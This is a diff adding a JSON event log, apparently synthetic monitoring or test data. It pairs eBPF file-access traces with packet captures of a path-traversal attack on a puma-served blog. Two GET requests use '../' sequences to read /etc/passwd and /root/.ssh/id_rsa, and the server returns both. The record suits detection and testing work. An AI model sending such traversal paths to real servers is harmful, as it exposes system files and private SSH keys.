@@ -1,0 +1,17 @@
+{
+  "id": 12,
+  "timestamp": 1783017000,
+  "events": [
+    "[ebpf] Waiting for encrypted data on /dev/pts/7...",
+    "[network:/dev/pts/11] {\"event\": \"startup\", \"message\": \"Network packet sniffer is running\"}",
+    "[network:/dev/pts/11] {\"event\": \"info\", \"message\": \"Sniffing on interfaces: ['eth0']\"}",
+    "[network:/dev/pts/11] {\"packet_number\": 1, \"timestamp\": \"2026-07-05T18:30:00.000000+00:00\", \"ethernet\": {\"src_mac\": \"52:55:0a:00:02:12\", \"dst_mac\": \"52:54:00:12:34:56\", \"type\": \"0x800\"}, \"network\": {\"version\": 4, \"src_ip\": \"198.51.100.40\", \"dst_ip\": \"10.0.2.3\", \"protocol_number\": 6, \"protocol_name\": \"TCP\", \"ttl\": 52, \"tos\": 0, \"identification\": 6001, \"flags\": \"DF\", \"fragment_offset\": 0, \"total_length\": 380, \"header_length\": 20}, \"transport\": {\"protocol\": \"TCP\", \"src_port\": 52210, \"dst_port\": 80, \"length\": 360, \"checksum\": 41001}, \"http\": {\"type\": \"request\", \"method\": \"GET\", \"path\": \"/assets/images/../../../../../../etc/passwd?id=req884\", \"version\": \"HTTP/1.1\", \"headers\": {\"Host\": \"blog.internal\"}}, \"payload\": {\"size_bytes\": 340}, \"services\": {\"src_service\": null, \"dst_service\": \"http\"}, \"process\": null, \"direction\": \"inbound\", \"raw_packet_size\": 414}",
+    "[ebpf] 18:30:00.120  puma             6210     33       open       FILE: /usr/src/blog/app/assets/images/../../../../../../etc/passwd FLAGS: 0x0 [PATH_TRAVERSAL]",
+    "[ebpf] 18:30:00.130  puma             6210     33       read       fd=18 size=16384",
+    "[network:/dev/pts/11] {\"event\": \"info\", \"message\": \"HTTP response 200 to 198.51.100.40 for GET /assets/images/../../../../../../etc/passwd?id=req884, content-type served as image/jpeg, 16384 bytes cached and returned\"}",
+    "[network:/dev/pts/11] {\"packet_number\": 2, \"timestamp\": \"2026-07-05T18:30:04.000000+00:00\", \"ethernet\": {\"src_mac\": \"52:55:0a:00:02:12\", \"dst_mac\": \"52:54:00:12:34:56\", \"type\": \"0x800\"}, \"network\": {\"version\": 4, \"src_ip\": \"198.51.100.40\", \"dst_ip\": \"10.0.2.3\", \"protocol_number\": 6, \"protocol_name\": \"TCP\", \"ttl\": 52, \"tos\": 0, \"identification\": 6002, \"flags\": \"DF\", \"fragment_offset\": 0, \"total_length\": 388, \"header_length\": 20}, \"transport\": {\"protocol\": \"TCP\", \"src_port\": 52211, \"dst_port\": 80, \"length\": 368, \"checksum\": 41002}, \"http\": {\"type\": \"request\", \"method\": \"GET\", \"path\": \"/assets/images/../../../../../../root/.ssh/id_rsa?id=req885\", \"version\": \"HTTP/1.1\", \"headers\": {\"Host\": \"blog.internal\"}}, \"payload\": {\"size_bytes\": 348}, \"services\": {\"src_service\": null, \"dst_service\": \"http\"}, \"process\": null, \"direction\": \"inbound\", \"raw_packet_size\": 422}",
+    "[ebpf] 18:30:04.110  puma             6210     33       open       FILE: /usr/src/blog/app/assets/images/../../../../../../root/.ssh/id_rsa FLAGS: 0x0 [PATH_TRAVERSAL]",
+    "[ebpf] 18:30:04.120  puma             6210     33       read       fd=19 size=3243",
+    "[network:/dev/pts/11] {\"event\": \"info\", \"message\": \"HTTP response 200 to 198.51.100.40 for GET /assets/images/../../../../../../root/.ssh/id_rsa?id=req885, content-type served as image/jpeg, 3243 bytes cached and returned\"}"
+  ]
+}
